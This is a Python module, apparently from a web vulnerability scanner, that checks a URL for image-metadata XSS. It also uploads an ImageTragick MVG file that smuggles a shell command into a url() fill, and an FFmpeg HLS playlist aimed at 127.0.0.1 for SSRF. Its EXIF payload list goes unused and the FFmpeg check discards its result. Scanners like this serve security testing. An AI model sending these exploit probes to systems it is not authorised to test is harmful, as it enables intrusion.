"""Image metadata (EXIF) injection scanner."""
from core.http import get, post
from core.findings import Finding
from core.memory import log_event
import urllib.parse

# EXIF payload with XSS in metadata fields
EXIF_PAYLOADS = [
    "ImageDescription: <script>alert(1)</script>",
    "Artist: \"><img src=x onerror=alert(1)>",
    "Copyright: javascript:alert(1)",
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    r = get(url)
    if r.status != 0:
        # check if image served with XSS content-type or reflected metadata
        ct = r.headers.get("content-type", "")
        if "image" in ct and ("<script" in (r.text or "") or "onerror" in (r.text or "")):
            findings.append(Finding(
                id="imgmeta-reflected-{}".format(hash(url) & 0xffff),
                target=parsed.netloc,
                type="Image Metadata XSS",
                severity="medium",
                url=url,
                parameter="image",
                payload="EXIF metadata",
                evidence="Image response contains script payload",
                response_snippet=r.snippet(200),
                confidence=0.6,
            ))
    # ImageTragick (ImageMagick) probe
    imagetragick = "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://example.com/image.jpg\"|ls \")'\npop graphic-context"
    try:
        files = {"file": ("exploit.mvg", imagetragick, "image/png")}
        resp = post(url, files=files)
        if resp.status != 0 and ("total" in (resp.text or "").lower() or "uid=" in (resp.text or "")):
            findings.append(Finding(
                id="imagetragick-{}".format(hash(url) & 0xffff),
                target=parsed.netloc,
                type="ImageTragick (ImageMagick RCE)",
                severity="critical",
                url=url,
                parameter="file",
                payload="MVG injection",
                evidence="ImageMagick processed malicious MVG",
                response_snippet=resp.snippet(300),
                confidence=0.5,
            ))
    except Exception:
        pass
    # FFmpeg HLS SSRF
    m3u8 = "#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:http://127.0.0.1:8080?x=\n#EXT-X-ENDLIST"
    try:
        files = {"file": ("exploit.m3u8", m3u8, "application/vnd.apple.mpegurl")}
        resp = post(url, files=files)
        if resp.status != 0:
            pass
    except Exception:
        pass
    log_event(parsed.netloc, "img_metadata_scan", {"url": url, "findings": len(findings)})
    return findings
